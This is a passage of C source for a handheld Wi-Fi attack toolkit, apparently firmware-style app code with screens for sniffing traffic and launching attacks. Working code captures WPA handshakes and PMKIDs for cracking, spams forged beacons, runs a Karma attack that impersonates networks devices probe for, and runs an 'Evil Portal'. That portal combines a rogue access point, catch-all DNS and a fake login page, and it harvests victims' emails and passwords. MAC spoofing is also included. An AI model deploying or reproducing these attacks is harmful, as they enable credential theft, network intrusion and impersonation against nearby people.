            str_append(hdr, sizeof(hdr), &used, ap->ssid[0] ? ap->ssid : ap->bssid);
            ui_title(hdr);
        }
        if (current == -127 && samples == 0) {
            ui_text("Scanning...");
        } else if (current == -127) {
            ui_text("AP not found");
        } else {
            char line[40];
            int used;
            used = 0; line[0] = '\0';
            str_append(line, sizeof(line), &used, "RSSI: ");
            str_append(line, sizeof(line), &used, itoa_s(current));
            str_append(line, sizeof(line), &used, " dBm");
            ui_text(line);
            rssi_bar(current, bar, sizeof(bar));
            ui_text(bar);
            used = 0; line[0] = '\0';
            str_append(line, sizeof(line), &used, "Min:");
            str_append(line, sizeof(line), &used, itoa_s(rssi_min));
            str_append(line, sizeof(line), &used, " Max:");
            str_append(line, sizeof(line), &used, itoa_s(rssi_max));
            ui_text(line);
            used = 0; line[0] = '\0';
            str_append(line, sizeof(line), &used, "Samples: ");
            str_append(line, sizeof(line), &used, itoa_s(samples));
            ui_text(line);
        }
        ui_button("Stop", 1);
        ui_end();

        int key = ui_poll_event();
        if (key == EV_BACK || key == 1) break;

        int n = wifi_scan(scan_buf, sizeof(scan_buf));
        if (n > 0) {
            int r = find_rssi_for_bssid(scan_buf, n, ap->bssid);
            if (r != -127) {
                current = r;
                samples++;
                if (samples == 1 || r < rssi_min) rssi_min = r;
                if (samples == 1 || r > rssi_max) rssi_max = r;
            }
        }
    }

    g_screen = SCR_AP_DETAIL;
}

// ── Monitor Mode (Raw frame stats) ────────────────────────────────────────────

static void screen_monitoring(void) {
    g_mon_ch = 1;
    // Draw a loading frame first so the display doesn't show stale sniff-menu
    // content while WASM is blocked in wifi_monitor_open() waiting for the
    // permission dialog (first run) or hardware init.
    ui_begin(); ui_title("Monitor CH1"); ui_text("Opening..."); ui_end();
    int open = (wifi_monitor_open(g_mon_ch) == 0);
    FrameStats stats;
    stats.total=0; stats.beacon=0; stats.probe=0;
    stats.deauth=0; stats.data=0; stats.other=0;
    static unsigned char frame_buf[FRAME_BUF_SZ];

    while (1) {
        if (open) {
            int n = wifi_monitor_read(frame_buf, sizeof(frame_buf), 50);
            if (n > 0) classify_frame(frame_buf, n, &stats);
        }

        ui_begin();
        {
            char hdr[24] = "Monitor  CH";
            int used = 11;
            str_append(hdr, sizeof(hdr), &used, itoa_s(g_mon_ch));
            ui_title(hdr);
        }
        if (!open) {
            ui_text("Not supported on this board");
        } else {
            char line[32];
            int used;
#define STAT_ROW(lbl, val) do { \
    used = 0; line[0] = '\0'; \
    str_append(line, sizeof(line), &used, lbl); \
    str_append(line, sizeof(line), &used, itoa_s(val)); \
    ui_text(line); } while(0)
            STAT_ROW("Total:   ", stats.total);
            STAT_ROW("Beacon:  ", stats.beacon);
            STAT_ROW("Probe:   ", stats.probe);
            STAT_ROW("Deauth:  ", stats.deauth);
            STAT_ROW("Data:    ", stats.data);
            STAT_ROW("Other:   ", stats.other);
#undef STAT_ROW
        }
        ui_row_begin();
        ui_button("CH+", 1);
        ui_button("CH-", 2);
        ui_row_end();
        ui_button("Stop", 3);
        ui_end();

        int ev = ui_poll_event();
        if (ev == EV_BACK || ev == 3) break;
        if (ev == 1 && g_mon_ch < 13) {
            g_mon_ch++;
            if (open) { wifi_monitor_close(); open = (wifi_monitor_open(g_mon_ch) == 0); }
        } else if (ev == 2 && g_mon_ch > 1) {
            g_mon_ch--;
            if (open) { wifi_monitor_close(); open = (wifi_monitor_open(g_mon_ch) == 0); }
        }
    }

    if (open) wifi_monitor_close();
    g_screen = SCR_SNIFF_MENU;
}

// ── Sniff Menu ────────────────────────────────────────────────────────────────

static int screen_sniff_menu(void) {
    ui_begin();
    ui_title("Sniff");
    ui_button("Beacons",     1);
    ui_button("Probes",      2);
    ui_button("Deauths",     3);
    ui_button("PMKID",       4);
    ui_button("Raw Monitor", 5);
    ui_button("< Back",      99);
    ui_end();

    int ev = ui_wait_event();
    if (ev == EV_BACK || ev == 99) g_screen = SCR_MAIN;
    else if (ev == 1) g_screen = SCR_SNIFF_BEACONS;
    else if (ev == 2) g_screen = SCR_SNIFF_PROBES;
    else if (ev == 3) g_screen = SCR_SNIFF_DEAUTHS;
    else if (ev == 4) g_screen = SCR_SNIFF_PMKID;
    else if (ev == 5) g_screen = SCR_MONITORING;
    return ev;
}

// ── Sniff Beacons ─────────────────────────────────────────────────────────────

static void screen_sniff_beacons(void) {
    g_sniff_ch = 1;
    g_sniff_ap_count = 0;
    pcap_reset(); g_pcap_save = 0;
    ui_begin(); ui_title("Beacons CH1"); ui_text("Opening..."); ui_end();
    int open = (wifi_monitor_open(g_sniff_ch) == 0);
    static unsigned char fbuf[FRAME_BUF_SZ];

    while (1) {
        int n = wifi_monitor_read(fbuf, sizeof(fbuf), 50);
        if (n >= 38) {
            if ((fbuf[0] >> 2 & 0x3) == 0 && (fbuf[0] >> 4 & 0xF) == 8) {
                pcap_add(fbuf, n);
                char bssid[MAX_BSSID_LEN], ssid[MAX_SSID_LEN];
                frame_bssid(fbuf, n, bssid);
                extract_ssid_ie(fbuf, n, 36, ssid);
                int ch = beacon_channel_ie(fbuf, n);
                if (bssid[0]) sniff_ap_seen(bssid, ssid, ch);
            }
        }

        ui_begin();
        {
            char hdr[32] = "Beacons  CH";
            int used = 11;
            str_append(hdr, sizeof(hdr), &used, itoa_s(g_sniff_ch));
            if (g_pcap_save) str_append(hdr, sizeof(hdr), &used, " [REC]");
            ui_title(hdr);
        }
        {
            char cnt[32] = "Found: ";
            int used = 7;
            str_append(cnt, sizeof(cnt), &used, itoa_s(g_sniff_ap_count));
            ui_text(cnt);
        }
        for (int i = 0; i < g_sniff_ap_count; i++) {
            char line[48];
            int used = 0; line[0] = '\0';
            str_append(line, sizeof(line), &used, g_sniff_aps[i].ssid[0] ? g_sniff_aps[i].ssid : "(hidden)");
            if (g_sniff_aps[i].channel) {
                str_append(line, sizeof(line), &used, " CH");
                str_append(line, sizeof(line), &used, itoa_s(g_sniff_aps[i].channel));
            }
            ui_text(line);
        }
        if (g_sniff_ap_count == 0) ui_text("Listening...");
        ui_row_begin();
        ui_button("CH+",  1);
        ui_button("CH-",  2);
        ui_button(g_pcap_save ? "Stop REC" : "REC",  4);
        ui_row_end();
        ui_button("Stop", 3);
        ui_end();

        int ev = ui_poll_event();
        if (ev == EV_BACK || ev == 3) break;
        if (ev == 4) {
            g_pcap_save ^= 1;
            if (!g_pcap_save && g_pcap_count > 0) pcap_save("beacons.pcap");
        }
        sniff_handle_ch(ev, &open);
    }

    if (g_pcap_save && g_pcap_count > 0) pcap_save("beacons.pcap");
    if (open) wifi_monitor_close();
    g_screen = SCR_SNIFF_MENU;
}

// ── Sniff Probes ──────────────────────────────────────────────────────────────

static void screen_sniff_probes(void) {
    g_sniff_ch = 1;
    g_sniff_prb_count = 0;
    pcap_reset(); g_pcap_save = 0;
    ui_begin(); ui_title("Probes CH1"); ui_text("Opening..."); ui_end();
    int open = (wifi_monitor_open(g_sniff_ch) == 0);
    static unsigned char fbuf[FRAME_BUF_SZ];

    while (1) {
        int n = wifi_monitor_read(fbuf, sizeof(fbuf), 50);
        if (n >= 26) {
            int type = (fbuf[0] >> 2) & 0x3, subtype = (fbuf[0] >> 4) & 0xF;
            if (type == 0 && subtype == 4) {
                pcap_add(fbuf, n);
                char src[MAX_BSSID_LEN], ssid[MAX_SSID_LEN];
                frame_sa(fbuf, n, src);
                extract_ssid_ie(fbuf, n, 24, ssid);
                if (src[0]) sniff_probe_seen(ssid, src);
            }
        }

        ui_begin();
        {
            char hdr[32] = "Probes  CH";
            int used = 10;
            str_append(hdr, sizeof(hdr), &used, itoa_s(g_sniff_ch));
            if (g_pcap_save) str_append(hdr, sizeof(hdr), &used, " [REC]");
            ui_title(hdr);
        }
        {
            char cnt[32] = "Seen: ";
            int used = 6;
            str_append(cnt, sizeof(cnt), &used, itoa_s(g_sniff_prb_count));
            ui_text(cnt);
        }
        for (int i = 0; i < g_sniff_prb_count; i++) {
            char line[56];
            int used = 0; line[0] = '\0';
            const char* ssid = g_sniff_prb[i].ssid[0] ? g_sniff_prb[i].ssid : "(wildcard)";
            str_append(line, sizeof(line), &used, ssid);
            str_append(line, sizeof(line), &used, " x");
            str_append(line, sizeof(line), &used, itoa_s(g_sniff_prb[i].count));
            ui_text(line);
        }
        if (g_sniff_prb_count == 0) ui_text("Listening...");
        ui_row_begin();
        ui_button("CH+", 1);
        ui_button("CH-", 2);
        ui_button(g_pcap_save ? "Stop REC" : "REC", 4);
        ui_row_end();
        ui_button("Stop", 3);
        ui_end();

        int ev = ui_poll_event();
        if (ev == EV_BACK || ev == 3) break;
        if (ev == 4) {
            g_pcap_save ^= 1;
            if (!g_pcap_save && g_pcap_count > 0) pcap_save("probes.pcap");
        }
        sniff_handle_ch(ev, &open);
    }

    if (g_pcap_save && g_pcap_count > 0) pcap_save("probes.pcap");
    if (open) wifi_monitor_close();
    g_screen = SCR_SNIFF_MENU;
}

// ── Sniff Deauths ─────────────────────────────────────────────────────────────

static void screen_sniff_deauths(void) {
    g_sniff_ch = 1;
    g_sniff_dau_count = 0;
    pcap_reset(); g_pcap_save = 0;
    ui_begin(); ui_title("Deauths CH1"); ui_text("Opening..."); ui_end();
    int open = (wifi_monitor_open(g_sniff_ch) == 0);
    static unsigned char fbuf[FRAME_BUF_SZ];

    while (1) {
        int n = wifi_monitor_read(fbuf, sizeof(fbuf), 50);
        if (n >= 26) {
            int type = (fbuf[0] >> 2) & 0x3, subtype = (fbuf[0] >> 4) & 0xF;
            if (type == 0 && (subtype == 12 || subtype == 10)) {
                pcap_add(fbuf, n);
                char bssid[MAX_BSSID_LEN], da[MAX_BSSID_LEN];
                frame_bssid(fbuf, n, bssid);
                frame_da(fbuf, n, da);
                int reason = mgmt_reason(fbuf, n);
                if (bssid[0]) sniff_deauth_seen(bssid, da, reason);
            }
        }

        ui_begin();
        {
            char hdr[32] = "Deauths  CH";
            int used = 11;
            str_append(hdr, sizeof(hdr), &used, itoa_s(g_sniff_ch));
            if (g_pcap_save) str_append(hdr, sizeof(hdr), &used, " [REC]");
            ui_title(hdr);
        }
        {
            char cnt[32] = "Caught: ";
            int used = 8;
            str_append(cnt, sizeof(cnt), &used, itoa_s(g_sniff_dau_count));
            ui_text(cnt);
        }
        for (int i = 0; i < g_sniff_dau_count; i++) {
            char line[56];
            int used = 0; line[0] = '\0';
            for (int c = 0; c < 11 && g_sniff_dau[i].bssid[c]; c++)
                line[used++] = g_sniff_dau[i].bssid[c];
            line[used] = '\0';
            str_append(line, sizeof(line), &used, " R");
            str_append(line, sizeof(line), &used, itoa_s(g_sniff_dau[i].reason));
            if (g_sniff_dau[i].count > 1) {
                str_append(line, sizeof(line), &used, " x");
                str_append(line, sizeof(line), &used, itoa_s(g_sniff_dau[i].count));
            }
            ui_text(line);
        }
        if (g_sniff_dau_count == 0) ui_text("Listening...");
        ui_row_begin();
        ui_button("CH+", 1);
        ui_button("CH-", 2);
        ui_button(g_pcap_save ? "Stop REC" : "REC", 4);
        ui_row_end();
        ui_button("Stop", 3);
        ui_end();

        int ev = ui_poll_event();
        if (ev == EV_BACK || ev == 3) break;
        if (ev == 4) {
            g_pcap_save ^= 1;
            if (!g_pcap_save && g_pcap_count > 0) pcap_save("deauths.pcap");
        }
        sniff_handle_ch(ev, &open);
    }

    if (g_pcap_save && g_pcap_count > 0) pcap_save("deauths.pcap");
    if (open) wifi_monitor_close();
    g_screen = SCR_SNIFF_MENU;
}

// ── Sniff PMKID ───────────────────────────────────────────────────────────────

static void screen_sniff_pmkid(void) {
    g_sniff_ch = 1;
    g_eapol_count = 0;
    pcap_reset(); g_pcap_save = 0;
    ui_begin(); ui_title("PMKID CH1"); ui_text("Opening..."); ui_end();
    int open = (wifi_monitor_open(g_sniff_ch) == 0);
    static unsigned char fbuf[FRAME_BUF_SZ];

    while (1) {
        int n = wifi_monitor_read(fbuf, sizeof(fbuf), 50);
        if (n >= 28) {
            int type = (fbuf[0] >> 2) & 0x3;
            if (type == 2) {
                int eapol_off = find_eapol_offset(fbuf, n);
                if (eapol_off >= 0 && eapol_off + 7 <= n) {
                    const unsigned char* ep = fbuf + eapol_off;
                    int rem = n - eapol_off;
                    int msg = eapol_key_msg(ep, rem);
                    if (msg > 0) {
                        pcap_add(fbuf, n);
                        char bssid[MAX_BSSID_LEN], sta[MAX_BSSID_LEN];
                        frame_bssid(fbuf, n, bssid);
                        frame_sa(fbuf, n, sta);
                        unsigned char pmkid[16];
                        int has = (msg == 1) ? try_extract_pmkid(ep, rem, pmkid) : 0;
                        if (bssid[0]) eapol_seen(bssid, sta, msg, pmkid, has);
                    }
                }
            }
        }

        ui_begin();
        {
            char hdr[28] = "PMKID  CH";
            int used = 9;
            str_append(hdr, sizeof(hdr), &used, itoa_s(g_sniff_ch));
            ui_title(hdr);
        }
        {
            char cnt[32] = "Handshakes: ";
            int used = 12;
            str_append(cnt, sizeof(cnt), &used, itoa_s(g_eapol_count));
            ui_text(cnt);
        }
        for (int i = 0; i < g_eapol_count; i++) {
            char line[56];
            int used = 0; line[0] = '\0';
            for (int c = 0; c < 11 && g_eapol[i].bssid[c]; c++)
                line[used++] = g_eapol[i].bssid[c];
            line[used] = '\0';
            str_append(line, sizeof(line), &used, " M");
            str_append(line, sizeof(line), &used, itoa_s(g_eapol[i].msg));
            if (g_eapol[i].has_pmkid) str_append(line, sizeof(line), &used, " *PMKID*");
            ui_text(line);
        }
        if (g_eapol_count == 0) ui_text("Waiting for handshake...");
        ui_row_begin();
        ui_button("CH+", 1);
        ui_button("CH-", 2);
        ui_button(g_pcap_save ? "Stop REC" : "REC", 4);
        ui_row_end();
        ui_button("Stop", 3);
        ui_end();

        int ev = ui_poll_event();
        if (ev == EV_BACK || ev == 3) break;
        if (ev == 4) {
            g_pcap_save ^= 1;
            if (!g_pcap_save && g_pcap_count > 0) pcap_save("pmkid.pcap");
        }
        sniff_handle_ch(ev, &open);
    }

    if (g_pcap_save && g_pcap_count > 0) pcap_save("pmkid.pcap");
    if (open) wifi_monitor_close();
    g_screen = SCR_SNIFF_MENU;
}

// ── Attacks Menu ──────────────────────────────────────────────────────────────

static int screen_attacks_menu(void) {
    ui_begin();
    ui_title("Attacks");
    ui_button("Beacon Spam",       1);
    ui_button("Beacon by AP List", 2);
    ui_button("Rickroll",          3);
    ui_button("Karma",             4);
    ui_button("Evil Portal",       5);
    ui_button("Set MAC",           6);
    ui_button("< Back",            99);
    ui_end();

    int ev = ui_wait_event();
    if (ev == EV_BACK || ev == 99)  g_screen = SCR_MAIN;
    else if (ev == 1) { g_beacon_ap_list_mode = 0; g_screen = SCR_BEACON_SPAM; }
    else if (ev == 2) { g_beacon_ap_list_mode = 1; g_screen = SCR_BEACON_SPAM; }
    else if (ev == 3) g_screen = SCR_RICKROLLING;
    else if (ev == 4) g_screen = SCR_KARMA;
    else if (ev == 5) g_screen = SCR_EVIL_PORTAL;
    else if (ev == 6) g_screen = SCR_MAC_SPOOF;
    return ev;
}

// ── Beacon Spam ───────────────────────────────────────────────────────────────

// Broadcast one 802.11 beacon per SSID in a NUL-separated buffer. Frames are
// built HERE in the app; the kernel only provides wifi_inject().
static void beacon_spam_round(const char* ssids_buf, int count, int channel) {
    const char* p = ssids_buf;
    for (int i = 0; i < count; i++) {
        int slen = 0; while (p[slen] && slen < 32) slen++;
        unsigned char frame[80] = {
            0x80, 0x00,                          // FC: beacon
            0xFF, 0xFF,                          // Duration
            0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF,  // DA: broadcast
            0xDE, 0xAD, 0xBE, 0xEF, 0xCA, 0x00,  // SA: fake (varied per SSID)
            0xDE, 0xAD, 0xBE, 0xEF, 0xCA, 0x00,  // BSSID
            0x00, 0x00,                          // Seq ctrl
            0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00, // timestamp
            0x64, 0x00,                          // beacon interval 100 TU
            0x01, 0x04,                          // caps: ESS + Short Slot
        };
        frame[15] = (unsigned char)(i & 0xFF);   // vary SA/BSSID last byte
        frame[21] = (unsigned char)(i & 0xFF);
        int pos = 36;
        frame[pos++] = 0x00;                     // SSID IE: tag
        frame[pos++] = (unsigned char)slen;      //          len
        for (int j = 0; j < slen; j++) frame[pos++] = (unsigned char)p[j];
        // Supported Rates IE — many scanners ignore a beacon without it.
        frame[pos++] = 0x01; frame[pos++] = 0x08;
        frame[pos++] = 0x82; frame[pos++] = 0x84; frame[pos++] = 0x8b;
        frame[pos++] = 0x96; frame[pos++] = 0x0c; frame[pos++] = 0x12;
        frame[pos++] = 0x18; frame[pos++] = 0x24;
        // DS Parameter Set IE — advertise the ACTUAL channel we're TX-ing on.
        frame[pos++] = 0x03; frame[pos++] = 0x01; frame[pos++] = (unsigned char)channel;
        int rc = wifi_inject(channel, frame, pos);
        if (i == 0) {   // diagnostic: confirm the radio accepts the TX
            char m[28] = "ch="; int u = 3;
            str_append(m, sizeof(m), &u, itoa_s(channel));
            str_append(m, sizeof(m), &u, " rc=");
            str_append(m, sizeof(m), &u, itoa_s(rc));
            nema_log("info", "Beacon", m);
        }
        while (*p) p++; p++;                      // next NUL-separated SSID
    }
}

static void screen_beacon_spam(void) {
    const char* ssids_buf;
    int ssids_count;

    static char ap_ssid_buf[512];
    static char custom_buf[512];

    if (g_beacon_ap_list_mode && g_ap_count > 0) {
        // Build NUL-separated list from scan results
        int buf_pos = 0, cnt = 0;
        for (int i = 0; i < g_ap_count && cnt < 20; i++) {
            if (g_aps[i].ssid[0]) {
                int slen = str_len(g_aps[i].ssid);
                if (buf_pos + slen + 1 < (int)sizeof(ap_ssid_buf)) {
                    str_copy(ap_ssid_buf + buf_pos, g_aps[i].ssid, slen + 1);
                    buf_pos += slen + 1;
                    cnt++;
                }
            }
        }
        ssids_buf   = ap_ssid_buf;
        ssids_count = cnt;
    } else {
        int n = nema_storage_fs_read_file("spam_ssids.txt", custom_buf, sizeof(custom_buf) - 1);
        int custom_count = 0;
        if (n > 0) {
            for (int i = 0; i < n; i++) if (custom_buf[i] == '\0') custom_count++;
            if (custom_buf[n-1] != '\0') { custom_buf[n] = '\0'; custom_count++; }
        }
        ssids_buf   = (custom_count > 0) ? custom_buf : kDefaultSpamSsids;
        ssids_count = (custom_count > 0) ? custom_count : DEFAULT_SPAM_COUNT;
    }

    if (ssids_count == 0) {
        ssids_buf = kDefaultSpamSsids; ssids_count = DEFAULT_SPAM_COUNT;
    }

    // Hop channels 1/6/11 each round so devices parked on ANY channel see the
    // fake APs — a single fixed channel (the old behaviour) was invisible to
    // clients connected elsewhere. Same recipe as deauth (which works): plain
    // inject, no promiscuous, follow the channel.
    static const int kHop[3] = {1, 6, 11};
    int rounds = 0;
    while (1) {
        beacon_spam_round(ssids_buf, ssids_count, kHop[rounds % 3]);
        rounds++;

        ui_begin();
        ui_title(g_beacon_ap_list_mode ? "Beacon by AP List" : "Beacon Spam");
        {
            char line[32] = "SSIDs: ";
            int used = 7;
            str_append(line, sizeof(line), &used, itoa_s(ssids_count));
            ui_text(line);
            char cnt[32] = "Rounds: ";
            used = 8;
            str_append(cnt, sizeof(cnt), &used, itoa_s(rounds));
            ui_text(cnt);
            ui_text("Broadcasting beacons...");
        }
        ui_button("Stop", 1);
        ui_end();

        int key = ui_poll_event();
        if (key == EV_BACK || key == 1) break;
        delay(100);
    }
    g_screen = SCR_ATTACKS_MENU;
}

// ── Rickroll ──────────────────────────────────────────────────────────────────

static void screen_rickrolling(void) {
    static const int kHop[3] = {1, 6, 11};   // hop so any nearby device sees it
    int rounds = 0;
    while (1) {
        beacon_spam_round(kRickrollSsids, RICKROLL_COUNT, kHop[rounds % 3]);
        rounds++;

        ui_begin();
        ui_title("Rickroll");
        ui_text("Never gonna give you up");
        ui_text("Never gonna let you down");
        {
            char cnt[32] = "Rounds: ";
            int used = 8;
            str_append(cnt, sizeof(cnt), &used, itoa_s(rounds));
            ui_text(cnt);
        }
        ui_button("Stop", 1);
        ui_end();

        int key = ui_poll_event();
        if (key == EV_BACK || key == 1) break;
        delay(100);
    }
    g_screen = SCR_ATTACKS_MENU;
}

// ── Karma ─────────────────────────────────────────────────────────────────────

static void screen_karma(void) {
    g_karma_count = 0;
    // Karma: sniff probe requests, reply with a matching fake AP. Built in-app
    // from the monitor + inject primitives — the kernel has no "karma" concept.
    static const int kHop[3] = {1, 6, 11};
    int hop_i = 0, dwell = 0;
    int open = (wifi_monitor_open(kHop[0]) == 0);
    static unsigned char fbuf[FRAME_BUF_SZ];
    int probes_seen = 0;

    while (1) {
        if (open) {
            // Hop the monitor channel (~3 ticks dwell each) — directed probes
            // are sent on the device's AP channel, not just channel 1.
            if (++dwell >= 3) { dwell = 0; hop_i = (hop_i + 1) % 3;
                                wifi_monitor_open(kHop[hop_i]); }
            // DRAIN the whole monitor ring each tick. Reading just one frame per
            // render lets the 128-slot ring overflow between renders and DROP the
            // rare DIRECTED probes (the ones carrying a real SSID like "unit1602")
            // while keeping only the flood of wildcard/broadcast probes — which is
            // exactly why the list looked empty/wildcard before.
            for (int drain = 0; drain < 128; drain++) {
                int n = wifi_monitor_read(fbuf, sizeof(fbuf), 0);  // non-blocking
                if (n <= 0) break;
                int type    = (fbuf[0] >> 2) & 0x3;
                int subtype = (fbuf[0] >> 4) & 0xF;
                if (n < 28 || type != 0 || subtype != 4 || fbuf[24] != 0x00) continue;
                int ssid_len = fbuf[25];
                probes_seen++;
                // Skip wildcard (len 0) and null/noise SSIDs — can't echo those.
                if (ssid_len <= 0 || ssid_len > 32 || 26 + ssid_len > n) continue;
                if (fbuf[26] < 0x20 || fbuf[26] >= 0x7f) continue;

                // Probe response echoing the requested SSID.
                unsigned char resp[120] = {
                    0x50, 0x00, 0x00, 0x00,              // FC: probe response
                    0,0,0,0,0,0,                         // DA = probe req SA (filled)
                    0xDE,0xAD,0xBE,0xEF,0xC0,0xDE,       // SA: fake BSSID
                    0xDE,0xAD,0xBE,0xEF,0xC0,0xDE,       // BSSID
                    0x00,0x00,                           // Seq
                    0,0,0,0,0,0,0,0,                     // timestamp
                    0x64,0x00,                           // interval
                    0x11,0x04,                           // caps
                };
                for (int i = 0; i < 6; i++) resp[4 + i] = fbuf[10 + i];  // DA
                resp[15] = (unsigned char)(fbuf[11] ^ 0xAA);
                resp[21] = resp[15];
                int pos = 36;
                resp[pos++] = 0x00; resp[pos++] = (unsigned char)ssid_len;
                for (int i = 0; i < ssid_len; i++) resp[pos++] = fbuf[26 + i];
                static const unsigned char rates[10] =
                    {0x01,0x08,0x82,0x84,0x8b,0x96,0x0c,0x12,0x18,0x24};
                for (int i = 0; i < 10; i++) resp[pos++] = rates[i];
                wifi_inject(kHop[hop_i], resp, pos);   // reply on the probe's channel

                // Record the SSID, deduplicated.
                char ssid[MAX_SSID_LEN];
                int si = 0;
                for (; si < ssid_len && si < MAX_SSID_LEN - 1; si++)
                    ssid[si] = (char)fbuf[26 + si];
                ssid[si] = '\0';
                int dup = 0;
                for (int k = 0; k < g_karma_count; k++)
                    if (str_eq(g_karma_hits[k].ssid, ssid)) { dup = 1; break; }
                if (!dup && g_karma_count < MAX_KARMA_HITS) {
                    str_copy(g_karma_hits[g_karma_count].ssid, ssid, MAX_SSID_LEN);
                    g_karma_hits[g_karma_count].sta[0] = '\0';
                    g_karma_count++;
                }
            }
        }

        ui_begin();
        ui_title("Karma Attack");
        if (!open) {
            ui_text("Monitor not supported");
        } else {
            char cnt[40] = "Probes seen: "; int used = 13;
            str_append(cnt, sizeof(cnt), &used, itoa_s(probes_seen));
            ui_text(cnt);
            if (g_karma_count == 0) {
                ui_text("No named probes yet");
                ui_text("(most devices send wildcard)");
            } else {
                ui_text("Saved networks probed:");
                for (int i = 0; i < g_karma_count && i < 5; i++) {
                    char line[48] = "> "; int u2 = 2;
                    str_append(line, sizeof(line), &u2, g_karma_hits[i].ssid);
                    ui_text(line);
                }
            }
        }
        ui_button("Stop", 1);
        ui_end();

        int key = ui_poll_event();
        if (key == EV_BACK || key == 1) break;
    }

    if (open) wifi_monitor_close();
    g_screen = SCR_ATTACKS_MENU;
}

// ── Evil Portal ───────────────────────────────────────────────────────────────

// Captive login page served by the in-app HTTP server.
static const char kPortalHtml[] =
    "<!DOCTYPE html><html><head><title>WiFi Portal</title>"
    "<style>body{font-family:sans-serif;max-width:400px;margin:60px auto;text-align:center}"
    "input{width:100%;padding:8px;margin:6px 0;box-sizing:border-box;border:1px solid #ccc;border-radius:4px}"
    "button{background:#0070f3;color:#fff;padding:10px 32px;border:none;border-radius:4px;font-size:16px}"
    "h2{color:#333}</style></head><body>"
    "<h2>Network Login</h2><p>Sign in to get internet access</p>"
    "<form method=POST action=/submit>"
    "<input name=email type=email placeholder='Email address' required>"
    "<input name=pass type=password placeholder='Password' required>"
    "<br><button type=submit>Connect</button></form></body></html>";

// Build a catch-all DNS A-record reply (every query → 192.168.4.1), in-app.
static int ep_dns_reply(const unsigned char* q, int qlen,
                        unsigned char* r, int rmax) {
    if (qlen < 12 || rmax < qlen + 16) return 0;
    nema_memcpy(r, q, qlen);
    r[2] = 0x81; r[3] = 0x80;            // flags: response, recursion available
    r[6] = 0x00; r[7] = 0x01;            // answer count = 1
    r[8] = r[9] = r[10] = r[11] = 0;     // no NS/AR
    int pos = qlen;
    r[pos++] = 0xC0; r[pos++] = 0x0C;    // name pointer to question
    r[pos++] = 0x00; r[pos++] = 0x01;    // type A
    r[pos++] = 0x00; r[pos++] = 0x01;    // class IN
    r[pos++] = 0x00; r[pos++] = 0x00; r[pos++] = 0x00; r[pos++] = 0x01;  // TTL 1s
    r[pos++] = 0x00; r[pos++] = 0x04;    // RDLENGTH 4
    r[pos++] = 192; r[pos++] = 168; r[pos++] = 4; r[pos++] = 1;          // 192.168.4.1
    return pos;
}

// Evil portal built ENTIRELY in-app from generic primitives (Plan 91): a soft AP
// + a UDP:53 DNS catch-all + a TCP:80 HTTP server, all polled from this loop.
// The kernel has no "evil portal" concept.
static void screen_evil_portal(void) {
    static int ssid_idx = 0;
    g_ep_cred_count = 0;
    int started = 0, dns = -1, http = -1;

    while (1) {
        if (!started) {
            ui_begin();
            ui_title("Evil Portal");
            ui_text("Choose broadcast SSID:");
            ui_text(kEpSsids[ssid_idx]);
            ui_button("Next SSID", 1);
            ui_button("Start",     2);
            ui_button("< Back",    99);
            ui_end();

            int ev = ui_wait_event();
            if (ev == EV_BACK || ev == 99) { g_screen = SCR_ATTACKS_MENU; return; }
            if (ev == 1) ssid_idx = (ssid_idx + 1) % N_EP_SSIDS;
            if (ev == 2) {
                if (wifi_ap_start(kEpSsids[ssid_idx], 1, 1) == 0) {
                    dns  = net_udp_open(53);
                    http = net_tcp_listen(80);
                    started = (dns >= 0 && http >= 0);
                    if (!started) {
                        if (dns  >= 0) net_close(dns);
                        if (http >= 0) net_close(http);
                        wifi_ap_stop();
                    }
                }
            }
        } else {
            // DNS: answer every query with 192.168.4.1 (drives the captive prompt).
            static unsigned char dq[512], dr[600];
            unsigned int from_ip = 0, from_port = 0;
            int qn = net_udp_recv(dns, dq, sizeof(dq), &from_ip, &from_port);
            if (qn >= 12) {
                int rn = ep_dns_reply(dq, qn, dr, sizeof(dr));
                if (rn > 0) net_udp_send(dns, from_ip, (int)from_port, dr, rn);
            }

            // HTTP: serve the login page; capture POST /submit bodies.
            int c = net_tcp_accept(http);
            if (c >= 0) {
                static unsigned char hbuf[1280];
                int n = net_tcp_recv(c, hbuf, sizeof(hbuf) - 1);
                if (n > 0) {
                    hbuf[n] = '\0';
                    char* req = (char*)hbuf;
                    if (req[0] == 'P' && find_str(req, "/submit")) {
                        const char* body = find_str(req, "\r\n\r\n");
                        if (body && g_ep_cred_count < MAX_EP_CREDS) {
                            body += 4;
                            char* dst = g_ep_creds[g_ep_cred_count++];
                            int ci = 0;
                            while (*body && ci < 127) dst[ci++] = *body++;
                            dst[ci] = '\0';
                        }
                        const char* thanks =
                            "HTTP/1.0 200 OK\r\nContent-Type:text/html\r\n\r\n"
                            "<html><body><h2>Connected!</h2></body></html>";
                        net_tcp_send(c, (const unsigned char*)thanks, str_len(thanks));
                    } else {
                        char hdr[96]; int used = 0; hdr[0] = '\0';
                        int hl = str_len(kPortalHtml);
                        str_append(hdr, sizeof(hdr), &used,
                            "HTTP/1.0 200 OK\r\nContent-Type:text/html\r\nContent-Length:");
                        str_append(hdr, sizeof(hdr), &used, itoa_s(hl));
                        str_append(hdr, sizeof(hdr), &used, "\r\n\r\n");
                        net_tcp_send(c, (const unsigned char*)hdr, used);
                        net_tcp_send(c, (const unsigned char*)kPortalHtml, hl);
                    }
                }
                net_close(c);
            }

            ui_begin();
            {
                char hdr[48] = "Portal: ";
                int used = 8;
                str_append(hdr, sizeof(hdr), &used, kEpSsids[ssid_idx]);
                ui_title(hdr);
            }
            {
                char cnt[32] = "Creds caught: ";
                int used = 14;
                str_append(cnt, sizeof(cnt), &used, itoa_s(g_ep_cred_count));
                ui_text(cnt);
            }
            for (int i = 0; i < g_ep_cred_count && i < 4; i++) ui_text(g_ep_creds[i]);
            if (g_ep_cred_count == 0) ui_text("Waiting for victims...");
            ui_button("Stop", 1);
            ui_end();

            int key = ui_poll_event();
            if (key == EV_BACK || key == 1) break;
            delay(5);   // keep the DNS/HTTP poll responsive without spinning the CPU
        }
    }

    if (started) {
        if (dns  >= 0) net_close(dns);
        if (http >= 0) net_close(http);
        wifi_ap_stop();
    }
    g_screen = SCR_ATTACKS_MENU;
}

// ── MAC Spoof ─────────────────────────────────────────────────────────────────

static void screen_mac_spoof(void) {
    static int mac_idx = 0;

    while (1) {
        ui_begin();
        ui_title("Set MAC Address");
        ui_text("Select a MAC to apply:");
        ui_text(kFakeMacs[mac_idx]);
        ui_button("Next MAC", 1);
        ui_button("Apply",    2);
        ui_button("< Back",   99);
        ui_end();

